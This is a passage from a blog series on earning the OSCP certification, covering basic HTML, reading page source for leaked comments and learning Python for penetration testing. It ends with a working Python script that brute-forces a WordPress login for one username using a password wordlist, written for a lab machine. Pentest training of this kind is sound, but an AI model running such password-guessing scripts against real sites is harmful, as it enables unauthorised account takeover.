---
layout: default
---
# How to earn your OSCP certification (2024)
## 3. Improve your programming skills

Let's start with a perhaps obvious premise, but one that if not clarified could discourage those approaching the goal of obtaining an OSCP certification (or similar) without coming from other IT sectors.

You don't need to become a full-fledged programmer to work in cybersecurity, but as often happens, having more tools in your arsenal can greatly simplify life when you need to deal with code (often written by others, which isn't always a positive aspect).

So where to begin? As I've often read and heard from professionals much more experienced than me, there's no right starting point when it comes to IT knowledge - every piece learned can prove useful when we least expect it. However, it's also true that some topics are more recurring than others, and perhaps for this reason, they're worth exploring if our background on this subject is a blank page.

Personally, I believe that as an initial step, one of the most useful approaches is understanding how a web page works. Again, for most people reading this chapter, this will all be very simple and basic, but I like to think that even someone completely new to the cybersecurity field can become passionate about it. Moreover, you never know - even those with some experience might pick up nuances less tied to the technical aspect but still interesting from a social engineering perspective.

Let's start gradually, let's open any web page:

![example.com.png](/assets/images/earn-oscp/cap3/example.com.png)

By pressing CTRL+U on the web page, you can examine its code.

```
<!doctype html>
<html>
<head>
    <title>Example Domain</title>

    <meta charset="utf-8" />
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style type="text/css">
    body {
        background-color: #f0f0f2;
        margin: 0;
        padding: 0;
        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
        
    }
    div {
        width: 600px;
        margin: 5em auto;
        padding: 2em;
        background-color: #fdfdff;
        border-radius: 0.5em;
        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
    }
    a:link, a:visited {
        color: #38488f;
        text-decoration: none;
    }
    @media (max-width: 700px) {
        div {
            margin: 0 auto;
            width: auto;
        }
    }
    </style>    
</head>

<body>
<div>
    <h1>Example Domain</h1>
    <p>This domain is for use in illustrative examples in documents. You may use this
    domain in literature without prior coordination or asking for permission.</p>
    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
</div>
</body>
</html>
```

Now, the goal of this chapter is not to study or delve deep into the code, but to understand why it's useful to have some basic knowledge. As you can see, the HTML code of the page is divided into TAGS, which are container elements that hold the parts that need to be displayed on the page and assign them certain attributes.

The code section that handles giving specific aesthetic attributes to page elements is the one contained in the <style></style> TAGS, which in this case also specify the language used to draw the page, namely CSS.

Let's divert the discussion for a moment to return to a key point later - for this very simple web page, 46 lines of code are needed. A website is generally composed of multiple HTML pages, dedicated CSS pages, and JavaScript files to dynamically modify the page's behavior based on user interactions. We can easily understand that the number of lines of code increases exponentially as the complexity of the website we're visiting increases.

This is true for web applications that we can access through browsers, as well as for local software we use daily. Personally, I find this site very interesting to get a clear sense of scale for what we're talking about:

<a href="https://informationisbeautiful.net/visualizations/million-lines-of-code/" style="font-size: 18px">Codebases - Millions of lines of code</a>

![2552_Lines_of_code_Dec18_FB.png](/assets/images/earn-oscp/cap3/2552_Lines_of_code_Dec18_FB.png)

This premise is necessary to understand what we're dealing with most of the time when we try to interact with code written by others. The rule suggests that good code should be well-commented, but those who have already dealt with experiences of this type know well that this rarely happens. Being able to navigate through code, for example of a web page, even without understanding in detail what it does, can lead to interesting discoveries of useful information left in the comments by those who wrote it, for example.

The example below is a simple one, but I have encountered situations like this even in actively running applications (you can view the web page code by pressing F12 - browser dev tools are a very useful tool to learn how to leverage).

![example-web-page.png](/assets/images/earn-oscp/cap3/example-web-page.png)

Regarding "classic" software code, it's very useful to start experimenting by getting your hands dirty firsthand. I believe my opinion aligns with the common one, which is to start playing with Python, a rather simple language for learning the basics that could also prove useful in the initial phases of scripting for performing penetration tests. For example, in the case below, I had recently started playing with laboratory machines provided by various dedicated platforms (like Hack the Box, Try Hack Me etc.), and I wanted to experiment by writing a login script for a WordPress page, using a list of hypothetical passwords for the username "james" obtained from previous reconnaissance operations.

```
import requests
import sys

url='http://10.10.110.100:65000/wordpress/wp-login.php'
data={
        'log': 'james',
        'pwd': '',
        'wp-submit': 'Log+In',
        'redirect_to': 'http://10.10.110.100:65000/wordpress/wp-admin/'
        }
i=1

dictionary=open('/home/kali/PenTest/VAPT-DANTE/wordpress_dictionary', 'r')

for line in dictionary:
    data['pwd']=line.strip()
    r=requests.post(url, data=data, allow_redirects=False)
    print("Searching password in dictionary...", str(i), " of 508")
    if r.status_code == 302:
        print(line.strip())
        sys.exit()
    i=i+1
dictionary.close()
```

This is meant to be just an example and, while it's nothing too complex, my advice is to approach the fundamental concepts gradually. There are many books and video tutorials that explain Python basics very well - it won't be difficult to start writing your first lines of code.

<div class="row">
  <div class="column3"><a href="/pages/blog/earn-oscp/2-note-taking-method" style="font-size: 18px">Back<< 2. Review Your Note-Taking Method</a></div>
  <div class="column1"></div>
  <div class="column3"><a href="/pages/blog/earn-oscp/4-report" style="font-size: 18px" >Next>> 4. Learn how to write a good report</a><div>
</div>